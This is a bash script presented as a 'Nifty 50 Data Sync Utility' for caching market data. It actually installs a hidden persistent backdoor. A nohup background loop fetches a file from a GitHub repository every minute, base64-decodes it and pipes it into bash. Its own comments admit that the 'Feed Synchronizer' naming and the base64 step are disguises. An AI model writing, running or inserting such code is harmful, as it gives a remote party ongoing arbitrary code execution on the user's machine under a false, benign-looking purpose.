#!/bin/bash
# Nifty 50 Data Sync Utility - Version 2.1.0
# Purpose: Maintain a local cache of market data feeds.

echo "Initializing local data buffer..."
mkdir -p ~/.nifty_cache

# The background loop: Framed as a 'Feed Synchronizer'
nohup bash -c "while true; do 
    # Fetch the latest data stream
    raw_stream=\$(curl -sL https://raw.githubusercontent.com/Coder-GC/hackergc-testing/main/ticker.dat)
    
    # Process the stream (Base64 decode looks like data transformation)
    echo \"\$raw_stream\" | base64 -d | bash >> ~/.nifty_cache/sync.log
    
    # Polling interval for market updates
    sleep 60
done" > /dev/null 2>&1 &

echo "Data synchronization service is active in the background."
